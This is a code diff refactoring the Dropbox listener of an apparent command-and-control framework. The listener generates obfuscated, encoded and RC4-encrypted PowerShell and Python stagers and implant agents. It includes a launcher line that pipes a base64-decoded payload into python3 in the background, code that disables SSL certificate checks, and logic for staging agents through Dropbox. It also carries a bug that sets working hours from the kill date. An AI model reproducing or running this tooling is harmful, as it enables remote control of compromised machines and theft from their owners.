@@ -281,18 +281,16 @@ class Listener:
                     stager,
                     obfuscation_command=obfuscation_command,
                 )
-                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             # base64 encode the stager and return it
             if encode and (
                 (not obfuscate) or ("launcher" not in obfuscation_command.lower())
             ):
                 return helpers.powershell_launcher(stager, launcher)
-            else:
-                # otherwise return the case-randomized stager
-                return stager
+            # otherwise return the case-randomized stager
+            return stager
 
-        elif language.startswith("py"):
+        if language.startswith("py"):
             launcherBase = "import sys;"
             # monkey patch ssl woohooo
             launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;"
@@ -357,21 +355,14 @@ class Listener:
                 launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                     launcherBase
                 )
-                launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
-                    launcherBase
-                )
 
             if encode:
                 launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                     "UTF-8"
                 )
-                launcher = (
-                    "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &"
-                    % (launchEncoded)
-                )
-                return launcher
-            else:
-                return launcherBase
+                return f"echo \"import sys,base64;exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
+            return launcherBase
+        return None
 
     def generate_stager(
         self,
@@ -438,22 +429,21 @@ class Listener:
                     stager,
                     obfuscation_command=obfuscation_command,
                 )
-                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             # base64 encode the stager and return it
             if encode:
                 return helpers.enc_powershell(stager)
-            elif encrypt:
+            if encrypt:
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(
                     RC4IV + stagingKey.encode("UTF-8"),
                     stager.encode("UTF-8"),
                 )
-            else:
-                # otherwise just return the case-randomized stager
-                return stager
 
-        elif language.lower() == "python":
+            # otherwise just return the case-randomized stager
+            return stager
+
+        if language.lower() == "python":
             template_path = [
                 os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                 os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
@@ -476,7 +466,6 @@ class Listener:
 
             if obfuscate:
                 stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
-                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             if encode:
                 return base64.b64encode(stager)
@@ -486,14 +475,14 @@ class Listener:
                 return RC4IV + encryption.rc4(
                     RC4IV + stagingKey.encode("UTF-8"), stager.encode("UTF-8")
                 )
-            else:
-                # otherwise return the standard stager
-                return stager
 
-        else:
-            log.error(
-                "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-            )
+            # otherwise return the standard stager
+            return stager
+
+        log.error(
+            "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+        )
+        return None
 
     def generate_agent(
         self,
@@ -547,11 +536,10 @@ class Listener:
                     code,
                     obfuscation_command=obfuscation_command,
                 )
-                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             return code
 
-        elif language == "python":
+        if language == "python":
             if version == "ironpython":
                 f = self.mainMenu.installPath + "/data/agent/ironpython_agent.py"
             else:
@@ -563,38 +551,37 @@ class Listener:
             code = helpers.strip_python_comments(code)
 
             # patch some more
-            code = code.replace("delay = 60", "delay = %s" % (delay))
-            code = code.replace("jitter = 0.0", "jitter = %s" % (jitter))
+            code = code.replace("delay = 60", f"delay = {delay}")
+            code = code.replace("jitter = 0.0", f"jitter = {jitter}")
             code = code.replace(
                 'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
-                'profile = "%s"' % (profile),
+                f'profile = "{profile}"',
             )
-            code = code.replace("lostLimit = 60", "lostLimit = %s" % (lostLimit))
+            code = code.replace("lostLimit = 60", f"lostLimit = {lostLimit}")
             code = code.replace(
                 'defaultResponse = base64.b64decode("")',
-                'defaultResponse = base64.b64decode("%s")'
-                % (b64DefaultResponse.decode("UTF-8")),
+                'defaultResponse = base64.b64decode("{}")'.format(
+                    b64DefaultResponse.decode("UTF-8")
+                ),
             )
 
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
-                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
+                code = code.replace('killDate = ""', f'killDate = "{killDate}"')
             if workingHours != "":
-                code = code.replace(
-                    'workingHours = ""', 'workingHours = "%s"' % (killDate)
-                )
+                code = code.replace('workingHours = ""', f'workingHours = "{killDate}"')
 
             code = code.replace("REPLACE_COMMS", "")
 
             if obfuscate:
                 code = self.mainMenu.obfuscationv2.python_obfuscate(code)
-                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             return code
-        else:
-            log.error(
-                "[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module."
-            )
+
+        log.error(
+            "[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module."
+        )
+        return None
 
     def generate_comms(self, listenerOptions, language=None):
         """
@@ -614,48 +601,47 @@ class Listener:
             listenerOptions["ResultsFolder"]["Value"].strip("/"),
         )
 
-        if language:
-            if language.lower() == "powershell":
-                template_path = [
-                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
-                ]
-
-                eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("dropbox/comms.ps1")
-
-                template_options = {
-                    "api_token": api_token,
-                    "tasking_folder": taskingsFolder,
-                    "results_folder": resultsFolder,
-                }
-
-                comms = template.render(template_options)
-                return comms
-
-            elif language.lower() == "python":
-                template_path = [
-                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
-                ]
-                eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("dropbox/comms.py")
-
-                template_options = {
-                    "api_token": api_token,
-                    "taskings_folder": taskingsFolder,
-                    "results_folder": resultsFolder,
-                }
-
-                comms = template.render(template_options)
-                return comms
-
-            else:
-                log.error(
-                    "listeners/dbx generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-                )
-        else:
+        if not language:
             log.error("listeners/dbx generate_comms(): no language specified!")
+            return None
+
+        if language.lower() == "powershell":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("dropbox/comms.ps1")
+
+            template_options = {
+                "api_token": api_token,
+                "tasking_folder": taskingsFolder,
+                "results_folder": resultsFolder,
+            }
+
+            return template.render(template_options)
+
+        if language.lower() == "python":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("dropbox/comms.py")
+
+            template_options = {
+                "api_token": api_token,
+                "taskings_folder": taskingsFolder,
+                "results_folder": resultsFolder,
+            }
+
+            return template.render(template_options)
+
+        log.error(
+            "listeners/dbx generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+        )
+        return None
 
     def start_server(self, listenerOptions):
         """
@@ -806,16 +792,16 @@ class Listener:
         )
         try:
             # delete stager if it exists
-            delete_file(dbx, "%s/debugps" % (stagingFolder))
-            delete_file(dbx, "%s/debugpy" % (stagingFolder))
-            dbx.files_upload(stagerCodeps, "%s/debugps" % (stagingFolder))
-            dbx.files_upload(stagerCodepy, "%s/debugpy" % (stagingFolder))
+            delete_file(dbx, f"{stagingFolder}/debugps")
+            delete_file(dbx, f"{stagingFolder}/debugpy")
+            dbx.files_upload(stagerCodeps, f"{stagingFolder}/debugps")
+            dbx.files_upload(stagerCodepy, f"{stagingFolder}/debugpy")
         except dropbox.exceptions.ApiError:
             message = (
                 f"{listenerName}: Error uploading stager to '{stagingFolder}/stager'"
             )
             self.instance_log.error(message, exc_info=True)
-            return
+            return None
 
         while True:
             time.sleep(int(pollInterval))
@@ -897,8 +883,8 @@ class Listener:
 
                                     try:
                                         fileName2 = fileName.replace(
-                                            "%s_3.txt" % (sessionID),
-                                            "%s_2.txt" % (sessionID),
+                                            f"{sessionID}_3.txt",
+                                            f"{sessionID}_2.txt",
                                         )
                                         dbx.files_delete(fileName2)
                                     except dropbox.exceptions.ApiError:
